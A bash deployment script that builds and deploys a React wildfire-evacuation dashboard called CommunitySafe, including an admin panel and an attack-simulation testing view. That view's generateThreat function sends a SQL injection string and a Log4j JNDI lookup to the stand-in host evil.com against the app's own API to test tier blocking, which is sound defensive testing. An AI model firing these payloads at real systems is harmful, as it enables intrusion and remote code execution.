#!/bin/bash

# --- CONFIGURATION ---
APP_DIR="/root/community-safe-build"
WEB_ROOT="/var/www/html"

echo "=========================================="
echo "   CommunitySafe: v6.9 (Admin UI Fix)     "
echo "=========================================="

# 1. Install Node.js
if ! command -v node &> /dev/null; then
    tdnf install nodejs -y
fi

# 2. Clean & Prep
rm -rf $APP_DIR
mkdir -p $APP_DIR/src

# 3. Config Files
cat > $APP_DIR/package.json << 'EOF'
{
  "name": "community-safe",
  "private": true,
  "version": "6.9.0",
  "type": "module",
  "scripts": { "build": "vite build" },
  "dependencies": { "lucide-react": "^0.263.1", "react": "^18.2.0", "react-dom": "^18.2.0" },
  "devDependencies": { "@vitejs/plugin-react": "^4.0.3", "vite": "^4.4.5", "autoprefixer": "^10.4.14", "postcss": "^8.4.27", "tailwindcss": "^3.3.3" }
}
EOF

cat > $APP_DIR/vite.config.js << 'EOF'
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

export default defineConfig({
  plugins: [react()],
  server: { proxy: { '/api': 'http://app.communitysafe.local:5000' } }
})
EOF

cat > $APP_DIR/postcss.config.js << 'EOF'
export default { plugins: { tailwindcss: {}, autoprefixer: {}, }, }
EOF

cat > $APP_DIR/tailwind.config.js << 'EOF'
export default { content: ["./index.html", "./src/**/*.{js,ts,jsx,tsx}"], theme: { extend: {}, }, plugins: [], }
EOF

# 4. CSS
cat > $APP_DIR/src/index.css << 'EOF'
@tailwind base; @tailwind components; @tailwind utilities;
body { background-color: #f3f4f6; }
input::-webkit-search-decoration, input::-webkit-search-cancel-button { display: none !important; }
input:focus { outline: none; box-shadow: none; }
.viz-container { position: relative; background-color: #111827; border-radius: 0.75rem; padding: 2rem; overflow: hidden; min-height: 200px; z-index: 0; }
.viz-bg-grid { position: absolute; inset: 0; opacity: 0.1; background-image: radial-gradient(#fff 1px, transparent 1px); background-size: 20px 20px; }
@keyframes slideRight { 0% { left: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { left: 100%; opacity: 0; } }
.animate-slide-right { animation: slideRight 1.5s linear infinite; }
EOF

# 5. Index HTML
cat > $APP_DIR/index.html << 'EOF'
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CommunitySafe</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.jsx"></script>
  </body>
</html>
EOF

# 6. React Entry
cat > $APP_DIR/src/main.jsx << 'EOF'
import React from 'react'; import ReactDOM from 'react-dom/client'; import App from './App.jsx'; import './index.css';
ReactDOM.createRoot(document.getElementById('root')).render(<React.StrictMode><App /></React.StrictMode>,)
EOF

# 7. App Logic (FIXED ADMIN UI + OPTIMISTIC VIZ)
echo "[4/6] Writing application code..."
cat > $APP_DIR/src/App.jsx << 'EOF'
import React, { useState, useRef, useEffect } from 'react';
import { AlertTriangle, Shield, Info, Search, Send, Server, Globe, Database, Activity, Lock, Settings, Flame, ShieldAlert, Play, Ban, Map as MapIcon, Tent, Umbrella, ArrowLeft, ArrowRight, Network, MapPin, Check, X, Trash2, RefreshCw, Skull, Zap, Radar, Camera, Wind, Droplets, Thermometer, Wifi, WifiOff } from 'lucide-react';

// --- COMPONENTS ---
const Card = ({ children, className = "" }) => <div className={`${className.includes('bg-') ? '' : 'bg-white'} rounded-xl shadow-sm border border-gray-200 overflow-hidden ${className}`}>{children}</div>;
const Button = ({ children, onClick, variant = "primary", className = "", disabled = false }) => {
  const variants = { primary: "bg-blue-600 text-white hover:bg-blue-700 active:scale-95", danger: "bg-red-600 text-white hover:bg-red-700 active:scale-95", warning: "bg-yellow-500 text-white hover:bg-yellow-600 active:scale-95", outline: "border-2 border-gray-200 text-gray-600 hover:border-gray-300", dark: "bg-gray-800 text-white hover:bg-gray-900 active:scale-95" };
  return <button onClick={onClick} disabled={disabled} className={`px-4 py-2 rounded-lg font-medium transition-all duration-200 flex items-center justify-center gap-2 disabled:opacity-50 ${variants[variant]} ${className}`}>{children}</button>;
};
const Badge = ({ type }) => {
  const styles = { critical: "bg-red-100 text-red-700", warning: "bg-yellow-100 text-yellow-700", info: "bg-blue-100 text-blue-700", safe: "bg-green-100 text-green-700" };
  return <span className={`text-xs font-bold px-2 py-0.5 rounded-full border uppercase ${styles[type] || styles.info}`}>{type}</span>;
};

const SimpleMap = ({ markers, onMapClick, userLocation }) => {
  const mapRef = useRef(null); const mapInstance = useRef(null);
  useEffect(() => { if (mapRef.current && !mapInstance.current) { const L = window.L; const map = L.map(mapRef.current).setView([34.0919, -118.6021], 13); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OSM' }).addTo(map); mapInstance.current = map; map.on('click', (e) => { if(onMapClick) onMapClick(e); }); setTimeout(() => map.invalidateSize(), 100); } }, []);
  useEffect(() => { if (!mapInstance.current) return; const L = window.L; mapInstance.current.eachLayer(l => { if (l instanceof L.Marker) mapInstance.current.removeLayer(l); }); if(userLocation) L.marker([userLocation.lat, userLocation.lng]).addTo(mapInstance.current); markers.forEach(m => L.marker([m.lat, m.lng]).addTo(mapInstance.current).bindPopup(m.desc)); setTimeout(() => mapInstance.current.invalidateSize(), 100); }, [markers, userLocation]);
  return <div ref={mapRef} className="w-full h-full min-h-[200px]" />;
};

const FIRE_LEVELS = { 'Low': { bg: 'bg-green-500', text: 'text-green-700' }, 'Moderate': { bg: 'bg-blue-500', text: 'text-blue-700' }, 'High': { bg: 'bg-yellow-500', text: 'text-yellow-700' }, 'Extreme': { bg: 'bg-red-600', text: 'text-red-700' }, 'Critical': { bg: 'bg-purple-600', text: 'text-purple-700' } };
const CONDITIONS = { 'Low': { wind: '5 mph', humidity: '45%' }, 'Moderate': { wind: '12 mph', humidity: '30%' }, 'High': { wind: '25 mph', humidity: '15%' }, 'Extreme': { wind: '45 mph', humidity: '8%' }, 'Critical': { wind: '65 mph', humidity: '2%' } };
const DEFAULT_ZONES = [{ name: 'Fernwood', id: 'TOP-U019', status: 'warning' }, { name: 'Entrada', id: 'TOP-U012', status: 'safe' }, { name: 'Saddle Peak', id: 'TOP-U022', status: 'critical' }, { name: 'Tuna Canyon', id: 'TOP-U023', status: 'safe' }, { name: 'Topanga Gen', id: 'TOP-GEN', status: 'safe' }];

// WIDGETS
const FireDangerWidget = ({ fireLevel }) => ( <Card className="mb-6"><div className="p-6 flex flex-col sm:flex-row items-center justify-between gap-6"><div className="flex items-center gap-4"><div className={`p-4 rounded-full ${FIRE_LEVELS[fireLevel].bg} bg-opacity-20`}><Flame className={`w-10 h-10 ${FIRE_LEVELS[fireLevel].text}`} /></div><div><div className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-1">Current Fire Danger</div><div className={`text-4xl font-bold ${FIRE_LEVELS[fireLevel].text}`}>{fireLevel}</div></div></div><div className="flex gap-1.5">{Object.keys(FIRE_LEVELS).map((level) => (<div key={level} className={`w-10 h-2.5 rounded-full transition-all duration-500 ${level === fireLevel ? FIRE_LEVELS[level].bg : 'bg-gray-200'}`} />))}</div></div></Card> );
const ConditionsWidget = ({ fireLevel }) => { const data = CONDITIONS[fireLevel] || CONDITIONS['Moderate']; return <Card className="mb-6 p-4 bg-white"><div className="flex justify-between"><div className="flex flex-col items-center px-4 border-r w-1/3"><Wind className="w-5 h-5 text-blue-500 mb-1"/><span className="font-bold">{data.wind}</span></div><div className="flex flex-col items-center px-4 border-r w-1/3"><Droplets className="w-5 h-5 text-blue-400 mb-1"/><span className="font-bold">{data.humidity}</span></div><div className="flex flex-col items-center px-4 w-1/3"><Thermometer className="w-5 h-5 text-orange-500 mb-1"/><span className="font-bold">72°F</span></div></div></Card>; };
const WebcamWidget = ({ fireLevel }) => { const isDanger = ['Extreme', 'Critical'].includes(fireLevel); const cams = [ { id: 1, name: 'Topanga Canyon Blvd', url: isDanger ? 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExN2VlbzZ5anF6Yzh4Y3B5aDZnM3Z5bmh6Z3Z6Y3B5aDZnM3Z5bmh6ZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o6ozh46EbuWRYAcSY/giphy.gif' : 'https://images.unsplash.com/photo-1444491741275-3747c53c99b4?auto=format&fit=crop&w=600&q=80' }, { id: 2, name: 'Saddle Peak Ridge', url: isDanger ? 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZ3Z6Y3B5aDZnM3Z5bmh6Z3Z6Y3B5aDZnM3Z5bmh6Z3Z6Y3B5aCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xT0xeGWDzQr48JK8dA/giphy.gif' : 'https://images.unsplash.com/photo-1463693396721-8ca0cfa2b3b5?auto=format&fit=crop&w=600&q=80' } ]; return <Card><div className="p-4 border-b bg-gray-50 flex justify-between items-center"><h3 className="font-bold text-sm flex items-center gap-2"><Camera className="w-4 h-4"/> Live Feeds</h3><div className="bg-black/5 px-2 py-0.5 rounded-full flex items-center gap-1.5"><div className="w-2 h-2 rounded-full bg-red-500 animate-pulse"></div><span className="text-[10px] font-bold text-red-600">LIVE</span></div></div><div className="p-4 space-y-3">{cams.map(c => (<div key={c.id} className="relative rounded-lg overflow-hidden aspect-video bg-gray-900"><img src={c.url} className="w-full h-full object-cover"/><div className="absolute bottom-2 left-3 text-white text-xs font-bold shadow-sm">{c.name}</div></div>))}</div></Card>; };
const ResourceWidget = ({ activeResource, setActiveResource, resources, userLocation }) => (activeResource ? <Card className="h-64 bg-white"><div className="p-2 border-b flex gap-2"><button onClick={()=>setActiveResource(null)}><ArrowLeft/></button><b>Map</b></div><div className="h-full"><SimpleMap markers={resources.filter(r => !activeResource || r.type === activeResource)} userLocation={userLocation}/></div></Card> : <Card className="bg-blue-600 text-white"><div className="p-6 space-y-3"><h3 className="font-bold text-lg flex gap-2"><Info/> Resources</h3><button onClick={()=>setActiveResource('map')} className="w-full text-left p-2 bg-blue-500 rounded flex gap-2"><MapIcon/> Evac Map</button><button onClick={()=>setActiveResource('shelter')} className="w-full text-left p-2 bg-blue-500 rounded flex gap-2"><Tent/> Shelters</button><button onClick={()=>setActiveResource('sandbag')} className="w-full text-left p-2 bg-blue-500 rounded flex gap-2"><Umbrella/> Sandbags</button></div></Card>);
const ZoneLookupWidget = ({ zoneQuery, setZoneQuery, handleZoneSearch, isLoading, zoneResult }) => <Card className="p-6 bg-white"><h3 className="font-bold mb-2">Zone Lookup</h3><div className="flex gap-2"><input className="border p-2 flex-1 rounded" placeholder="Address" value={zoneQuery} onChange={e => setZoneQuery(e.target.value)} /><Button onClick={handleZoneSearch} disabled={isLoading}>Search</Button></div>{zoneResult && <div className={`mt-4 p-2 rounded ${zoneResult.status==='safe'?'bg-green-100':'bg-red-100'}`}>{zoneResult.msg}</div>}</Card>;

// NEW: Horizontal Zone Status Board (Resident)
const ZoneStatusBoard = ({ zones }) => (
  <Card className="bg-white mt-6">
    <div className="p-4 border-b border-gray-100 bg-gray-50 flex items-center gap-2">
       <MapPin className="w-4 h-4 text-gray-600" /><h3 className="font-bold text-gray-800 text-sm uppercase">Evacuation Status by Zone</h3>
    </div>
    <div className="p-4 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
      {zones.map(z => (
        <div key={z.id} className="flex items-center justify-between p-3 border rounded-lg bg-gray-50 hover:bg-white transition-all hover:shadow-sm">
           <div className="flex flex-col">
              <span className="font-bold text-sm text-gray-800">{z.name}</span>
              <span className="text-[10px] text-gray-400 font-mono">{z.id}</span>
           </div>
           <Badge type={z.status} />
        </div>
      ))}
    </div>
  </Card>
);

export default function CommunitySafe() {
  const [view, setView] = useState('resident'); 
  const [isLoading, setIsLoading] = useState(false);
  const [backendStatus, setBackendStatus] = useState('checking'); 
  const [fireLevel, setFireLevel] = useState(() => localStorage.getItem('cs_fireLevel') || 'Moderate');
  const [alerts, setAlerts] = useState([]);
  const [zones, setZones] = useState(() => JSON.parse(localStorage.getItem('cs_zones')) || DEFAULT_ZONES);
  const [resources, setResources] = useState([{id:1, type:'shelter', lat:34.0930, lng:-118.6000, desc:'Topanga Community Center'},{id:2, type:'sandbag', lat:34.0880, lng:-118.5950, desc:'Station'}]);
  const [trafficLog, setTrafficLog] = useState([]);
  const [linkStatus, setLinkStatus] = useState({ webApp: 'idle', appDb: 'idle', webAppLatency: null, appDbLatency: null });
  const [userLocation, setUserLocation] = useState(null);
  const trafficIdRef = useRef(0);
  
  const [zoneQuery, setZoneQuery] = useState('');
  const [zoneResult, setZoneResult] = useState(null);
  const [activeResource, setActiveResource] = useState(null);
  const [newAlertTitle, setNewAlertTitle] = useState('');
  const [newAlertMsg, setNewAlertMsg] = useState('');
  const [newAlertType, setNewAlertType] = useState('info');
  const [flowCount, setFlowCount] = useState(5);
  const [attackSrc, setAttackSrc] = useState('User');
  const [attackDst, setAttackDst] = useState('Web Tier');
  const [adminMapMode, setAdminMapMode] = useState(null);

  useEffect(() => { if (navigator.geolocation) navigator.geolocation.getCurrentPosition((pos) => setUserLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude })); fetchAlerts(); setInterval(fetchAlerts, 5000); }, []);
  useEffect(() => { localStorage.setItem('cs_fireLevel', fireLevel); localStorage.setItem('cs_zones', JSON.stringify(zones)); }, [fireLevel, zones]);

  const fetchWithTimeout = async (url, ms = 2000) => {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), ms);
      try { const res = await fetch(url, { signal: controller.signal }); clearTimeout(id); return res; } 
      catch(e) { clearTimeout(id); throw e; }
  };

  const fetchAlerts = async () => { 
      try { 
          const res = await fetchWithTimeout('/api/alerts'); 
          if (res.status === 200) { setAlerts(await res.json()); setBackendStatus('online'); }
          else if (res.status === 503) { setBackendStatus('partial'); }
          else throw new Error(); 
      } catch { setBackendStatus('offline'); } 
  };

  // --- SIMULATION LOGIC (Optimistic Viz) ---
  const simulateTraffic = async (action, type, srcOverride, dstOverride) => {
    const id = trafficIdRef.current++;
    const status = type === 'threat' ? 'threat' : 'active';
    let startStep = 1; let endStep = 3;
    const startNode = srcOverride || 'User'; const endNode = dstOverride || 'DB Tier';
    
    if (startNode === 'Web Tier') startStep = 2; if (startNode === 'App Tier') startStep = 3;
    if (endNode === 'Web Tier') endStep = 1; if (endNode === 'App Tier') endStep = 2;

    // 1. Initial Hop
    setTrafficLog(prev => [...prev, { id, step: startStep, src: startNode, dst: endNode, status: status }]);
    await new Promise(r => setTimeout(r, 600));

    // 2. Web -> App (Optimistic Move First)
    if (startStep < endStep) {
        setTrafficLog(prev => prev.map(t => t.id === id ? { ...t, step: startStep + 1 } : t));
        const tStart = Date.now();
        
        try {
            const webToApp = await fetchWithTimeout('/api/status'); 
            const lat = Date.now() - tStart;
            if (!webToApp.ok) throw new Error("Blocked");
            setLinkStatus(prev => ({ ...prev, webApp: 'active', webAppLatency: lat + 'ms' }));
        } catch (e) {
            setTrafficLog(prev => prev.map(t => t.id === id ? { ...t, status: 'blocked' } : t));
            setLinkStatus(prev => ({ ...prev, webApp: 'blocked', webAppLatency: 'TIMEOUT' }));
            setTimeout(() => setTrafficLog(prev => prev.filter(t => t.id !== id)), 2000);
            return; 
        }
        await new Promise(r => setTimeout(r, 600));
    }

    // 3. App -> DB (Optimistic Move First)
    if (startStep + 1 < endStep) {
        setTrafficLog(prev => prev.map(t => t.id === id ? { ...t, step: startStep + 2 } : t));
        const tStart = Date.now();

        try {
            const appToDb = await fetchWithTimeout('/api/chain');
            const lat = Date.now() - tStart;
            if (!appToDb.ok) throw new Error("Blocked");
            setLinkStatus(prev => ({ ...prev, appDb: 'active', appDbLatency: lat + 'ms' }));
        } catch (e) {
            setTrafficLog(prev => prev.map(t => t.id === id ? { ...t, status: 'blocked' } : t));
            setLinkStatus(prev => ({ ...prev, appDb: 'blocked', appDbLatency: 'TIMEOUT' }));
            setTimeout(() => setTrafficLog(prev => prev.filter(t => t.id !== id)), 2000);
            return; 
        }
        await new Promise(r => setTimeout(r, 1000));
    }
    setTrafficLog(prev => prev.filter(t => t.id !== id));
  };

  const generateThreat = async (type) => {
      let url = '/api/status'; 
      if (type === 'SQLI') url += "?id=' OR 1=1"; else if (type === 'LOG4J') url += "?q=${jndi:ldap://evil.com/x}";
      simulateTraffic(`THREAT_${type}`, 'threat', attackSrc, attackDst);
      try { await fetch(url); } catch {}
  };
  const handlePostAlert = async (e) => { e.preventDefault(); await fetch('/api/alerts', { method: 'POST', body: JSON.stringify({id: Date.now(), title: newAlertTitle, message: newAlertMsg, type: newAlertType, time:'Just now'}) }); fetchAlerts(); };
  const handleDeleteAlert = async (id) => { setAlerts(prev => prev.filter(a => a.id !== id)); };
  const handleUpdateFire = (l) => setFireLevel(l);
  const handleUpdateZoneStatus = (id, s) => setZones(prev => prev.map(z => z.id===id ? {...z, status:s} : z));
  const handleZoneSearch = async () => { if(!zoneQuery)return; setIsLoading(true); simulateTraffic('QUERY', 'success', 'User', 'DB Tier'); try { const res = await fetch(`https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(zoneQuery)}&format=json&limit=1`); const data = await res.json(); if(data.length>0) setZoneResult({zone:'TOP-U019', status:'safe', msg:'Clear', address: data[0].display_name}); else setZoneResult({status:'info', msg:'Not Found'}); } catch { setZoneResult({status:'info', msg:'Error'}); } setIsLoading(false); };
  const handleMapClick = (e) => { if (!adminMapMode) return; setResources([...resources, { id: Date.now(), type: adminMapMode, lat: e.latlng.lat, lng: e.latlng.lng, desc: `New ${adminMapMode}` }]); setAdminMapMode(null); simulateTraffic('ADD_RESOURCE', 'success', 'User', 'DB Tier'); };
  const runSingleFlow = () => simulateTraffic('TEST_SINGLE', 'success', 'User', 'DB Tier');
  const runManyFlows = async () => { for(let i=0; i<flowCount; i++) { await simulateTraffic('TEST_SEQ', 'success', 'User', 'DB Tier'); await new Promise(r => setTimeout(r, 300)); } };

  const InfrastructureViz = () => {
    const isWebToAppActive = trafficLog.some(t => t.step === 2 && t.status !== 'blocked');
    const isAppToDBActive = trafficLog.some(t => t.step === 3 && t.status !== 'blocked');
    return (
      <div className="mt-12 border-t border-gray-200 pt-8 viz-container">
        <div className="viz-bg-grid"></div>
        <div className="flex justify-between items-center relative z-10">
            <div className="bg-gray-800 border-2 border-blue-500 rounded p-4 text-center w-1/4"><Globe className="mx-auto text-blue-400"/><div className="text-white font-bold">Web Tier</div></div>
            
            <div className="flex-1 relative mx-2 flex flex-col items-center">
                 <div className={`w-full h-1 transition-colors duration-500 ${linkStatus.webApp === 'blocked' ? 'bg-red-500' : (linkStatus.webApp === 'active' ? 'bg-blue-500' : 'bg-gray-700')}`}></div>
                 {linkStatus.webApp === 'blocked' && <div className="absolute -top-3 bg-gray-900 rounded-full p-0.5"><ShieldAlert className="text-red-500 w-6 h-6" /></div>}
                 {linkStatus.webAppLatency && <span className={`text-[10px] mt-1 font-mono font-bold ${linkStatus.webApp === 'blocked' ? 'text-red-400' : 'text-blue-400'}`}>{linkStatus.webAppLatency}</span>}
                 {trafficLog.map(t => t.step === 2 && (<div key={t.id} className={`absolute top-0 -mt-1.5 w-4 h-4 rounded-full animate-slide-right ${t.status==='threat'?'bg-red-600':(t.status==='blocked'?'bg-red-500':'bg-blue-400')}`}></div>))}
            </div>

            <div className="bg-gray-800 border-2 border-purple-500 rounded p-4 text-center w-1/4"><Server className="mx-auto text-purple-400"/><div className="text-white font-bold">App Tier</div></div>
            
            <div className="flex-1 relative mx-2 flex flex-col items-center">
                 <div className={`w-full h-1 transition-colors duration-500 ${linkStatus.appDb === 'blocked' ? 'bg-red-500' : (linkStatus.appDb === 'active' ? 'bg-purple-500' : 'bg-gray-700')}`}></div>
                 {linkStatus.appDb === 'blocked' && <div className="absolute -top-3 bg-gray-900 rounded-full p-0.5"><ShieldAlert className="text-red-500 w-6 h-6" /></div>}
                 {linkStatus.appDbLatency && <span className={`text-[10px] mt-1 font-mono font-bold ${linkStatus.appDb === 'blocked' ? 'text-red-400' : 'text-purple-400'}`}>{linkStatus.appDbLatency}</span>}
                 {trafficLog.map(t => t.step === 3 && (<div key={t.id} className={`absolute top-0 -mt-1.5 w-4 h-4 rounded-full animate-slide-right ${t.status==='threat'?'bg-red-600':(t.status==='blocked'?'bg-red-500':'bg-purple-400')}`}></div>))}
            </div>

            <div className="bg-gray-800 border-2 border-green-500 rounded p-4 text-center w-1/4"><Database className="mx-auto text-green-400"/><div className="text-white font-bold">DB Tier</div></div>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen font-sans text-gray-900 pb-20">
      <nav className="bg-gray-900 text-white p-4 shadow-lg flex justify-between sticky top-0 z-50">
        <div className="flex gap-2 items-center cursor-pointer" onClick={() => setView('resident')}><Shield className="text-blue-500 fill-current"/> <h1 className="font-bold text-xl">CommunitySafe</h1></div>
        <div className="flex gap-2">
            <button onClick={() => setView('resident')} className={`px-4 py-1.5 text-sm font-medium rounded-md transition-colors ${view==='resident'?'bg-blue-600 text-white':'text-gray-400 hover:text-white hover:bg-gray-800'}`}>Resident</button>
            <button onClick={() => setView('admin')} className={`px-4 py-1.5 text-sm font-medium rounded-md transition-colors ${view==='admin'?'bg-blue-600 text-white':'text-gray-400 hover:text-white hover:bg-gray-800'}`}>Admin</button>
            <button onClick={() => setView('testing')} className={`px-4 py-1.5 text-sm font-medium rounded-md transition-colors ${view==='testing'?'bg-purple-600 text-white':'text-gray-400 hover:text-white hover:bg-gray-800'}`}>Testing</button>
        </div>
      </nav>
      <main className="max-w-6xl mx-auto px-4 py-8">
        <div className="flex justify-end mb-4"><div className={`flex items-center px-3 py-1 rounded-full text-xs font-bold border shadow-sm ${backendStatus === 'online' ? 'bg-green-100 text-green-700 border-green-200' : (backendStatus === 'partial' ? 'bg-yellow-100 text-yellow-700 border-yellow-200' : 'bg-red-100 text-red-700 border-red-200')}`}>{backendStatus === 'online' ? <Wifi className="w-3 h-3 mr-2"/> : <WifiOff className="w-3 h-3 mr-2"/>}{backendStatus === 'online' ? "SYSTEM ONLINE" : (backendStatus === 'partial' ? "DB UNREACHABLE" : "CONNECTION LOST")}</div></div>

        {view === 'resident' && (
           <div className="grid lg:grid-cols-3 gap-8">
              <div className="lg:col-span-2 space-y-6">
                  <FireDangerWidget fireLevel={fireLevel} />
                  <ConditionsWidget fireLevel={fireLevel} />
                  <div className="space-y-4">
                    {alerts.map(a => (
                        <Card key={a.id} className="p-5 border-l-4 border-blue-500 hover:shadow-md transition-shadow">
                            <div className="flex justify-between items-start mb-2">
                                <div className="flex items-center gap-3">
                                    {a.type === 'critical' ? <AlertTriangle className="w-5 h-5 text-red-600" /> : <Info className="w-5 h-5 text-blue-600" />}
                                    <h4 className="font-bold text-gray-900 text-lg">{a.title}</h4>
                                </div>
                                <span className="text-xs text-gray-400 font-medium">{a.time}</span>
                            </div>
                            <p className="text-gray-600 text-sm mb-3 leading-relaxed">{a.message}</p>
                            <Badge type={a.type} />
                        </Card>
                    ))}
                  </div>
                  <ZoneStatusBoard zones={zones} />
              </div>
              <div className="space-y-6 relative z-20">
                 <WebcamWidget fireLevel={fireLevel} />
                 <ResourceWidget activeResource={activeResource} setActiveResource={setActiveResource} resources={resources} userLocation={userLocation} />
                 <ZoneLookupWidget zoneQuery={zoneQuery} setZoneQuery={setZoneQuery} handleZoneSearch={handleZoneSearch} isLoading={isLoading} zoneResult={zoneResult} />
              </div>
           </div>
        )}

        {view === 'admin' && (
            <div className="grid lg:grid-cols-2 gap-6">
                <div className="space-y-6">
                    <Card className="h-fit p-6"><h3 className="font-bold mb-4">Threat Level</h3><div className="grid grid-cols-1 gap-2">{Object.keys(FIRE_LEVELS).map(l => <Button key={l} onClick={() => handleUpdateFire(l)} variant="outline">{l}</Button>)}</div></Card>
                    <Card className="p-6"><h3 className="font-bold mb-4">Zone Status (Admin)</h3><div className="space-y-2">{zones.map(z => (<div key={z.id} className="flex justify-between items-center border-b pb-2"><span className="text-sm font-bold">{z.name}</span><div className="flex gap-1"><button onClick={() => handleUpdateZoneStatus(z.id, 'safe')} className={`p-1.5 rounded transition-all ${z.status === 'safe' ? 'bg-green-500 text-white scale-110 shadow-sm' : 'bg-gray-100 text-gray-400'}`}><Check className="w-4 h-4"/></button><button onClick={() => handleUpdateZoneStatus(z.id, 'warning')} className={`p-1.5 rounded transition-all ${z.status === 'warning' ? 'bg-yellow-500 text-white scale-110 shadow-sm' : 'bg-gray-100 text-gray-400'}`}><AlertTriangle className="w-4 h-4"/></button><button onClick={() => handleUpdateZoneStatus(z.id, 'critical')} className={`p-1.5 rounded transition-all ${z.status === 'critical' ? 'bg-red-600 text-white scale-110 shadow-sm' : 'bg-gray-100 text-gray-400'}`}><X className="w-4 h-4"/></button></div></div>))}</div></Card>
                </div>
                <div className="space-y-6">
                    <Card className="p-6"><h3 className="font-bold mb-4">Broadcast Alert</h3><input className="w-full border p-2 mb-2" placeholder="Title" value={newAlertTitle} onChange={e => setNewAlertTitle(e.target.value)} /><textarea className="w-full border p-2 mb-2" placeholder="Message" value={newAlertMsg} onChange={e => setNewAlertMsg(e.target.value)} />
                        <div className="flex gap-2 mb-4">{['info','warning','critical'].map(t=><button key={t} onClick={()=>setNewAlertType(t)} className={`flex-1 py-2 text-sm capitalize border rounded ${newAlertType===t?'bg-gray-800 text-white':'bg-white'}`}>{t}</button>)}</div>
                        <Button onClick={handlePostAlert} className="w-full">Publish Alert</Button>
                    </Card>
                    <Card className="p-6"><h3 className="font-bold mb-4">Active Alerts</h3><div className="space-y-2">{alerts.map(a => (<div key={a.id} className="flex justify-between items-center border p-2 rounded"><span className="text-sm truncate w-48">{a.title}</span><button onClick={() => handleDeleteAlert(a.id)} className="text-red-500"><Trash2 className="w-4 h-4"/></button></div>))}</div></Card>
                    <Card className="h-[300px]"><div className="p-4 border-b bg-gray-50 flex justify-between items-center"><h3 className="font-bold">Resource Map</h3><div className="flex gap-2"><button onClick={() => setAdminMapMode('shelter')} className="px-2 py-1 text-xs rounded bg-indigo-600 text-white">Add Shelter</button><button onClick={() => setAdminMapMode('sandbag')} className="px-2 py-1 text-xs rounded bg-orange-500 text-white">Add Sandbag</button></div></div><div className="h-full relative z-0"><SimpleMap markers={resources} onMapClick={handleMapClick} userLocation={null} /></div></Card>
                </div>
            </div>
        )}

        {view === 'testing' && (
             <div className="space-y-6">
                 <div className="grid lg:grid-cols-2 gap-6">
                     <Card className="p-6"><h3 className="font-bold text-lg mb-4">Traffic Generator</h3><div className="flex gap-4 mb-4"><span className="text-sm font-bold">Count:</span><input type="number" value={flowCount} onChange={e => setFlowCount(e.target.value)} className="border w-16 text-center"/></div><div className="flex gap-4"><Button onClick={runSingleFlow}>Single Flow</Button><Button onClick={runManyFlows} variant="dark">Multi Flow</Button></div></Card>
                     <Card className="p-6 border-red-200 bg-red-50"><h3 className="font-bold text-red-800 mb-4 flex items-center"><ShieldAlert className="mr-2"/> Attack Simulation</h3><div className="flex gap-2 mb-4 text-xs"><select value={attackSrc} onChange={e => setAttackSrc(e.target.value)} className="border p-1 rounded"><option>User</option><option>Web Tier</option><option>App Tier</option></select><span>➔</span><select value={attackDst} onChange={e => setAttackDst(e.target.value)} className="border p-1 rounded"><option>Web Tier</option><option>App Tier</option><option>DB Tier</option></select></div><div className="grid grid-cols-1 gap-2">
                        <button onClick={() => generateThreat('SQLI')} className="w-full py-2 px-3 text-left text-sm font-bold text-red-700 bg-white border border-red-200 rounded hover:bg-red-100">SQL Injection</button>
                        <button onClick={() => generateThreat('LOG4J')} className="w-full py-2 px-3 text-left text-sm font-bold text-red-700 bg-white border border-red-200 rounded hover:bg-red-100">Log4j / RCE</button>
                        <button onClick={() => generateThreat('MALWARE')} className="w-full py-2 px-3 text-left text-sm font-bold text-red-700 bg-white border border-red-200 rounded hover:bg-red-100">Malware DL</button>
                        <button onClick={() => generateThreat('DNS_TUNNEL')} className="w-full py-2 px-3 text-left text-sm font-bold text-red-700 bg-white border border-red-200 rounded hover:bg-red-100">DNS Tunneling</button>
                        <button onClick={() => generateThreat('PORT_SCAN')} className="w-full py-2 px-3 text-left text-sm font-bold text-red-700 bg-white border border-red-200 rounded hover:bg-red-100">Port Scan</button>
                     </div></Card>
                 </div>
                 <InfrastructureViz />
             </div>
        )}
      </main>
    </div>
  );
}
EOF

# 8. Install & Build
echo "[6/6] Building application..."
cd $APP_DIR
npm install
npm run build

# 9. Deploy to Nginx
echo "Deploying..."
rm -rf $WEB_ROOT/*
cp -r dist/* $WEB_ROOT/
chmod -R 755 $WEB_ROOT

echo "=========================================="
echo "   Deployment Complete!                   "
echo "=========================================="
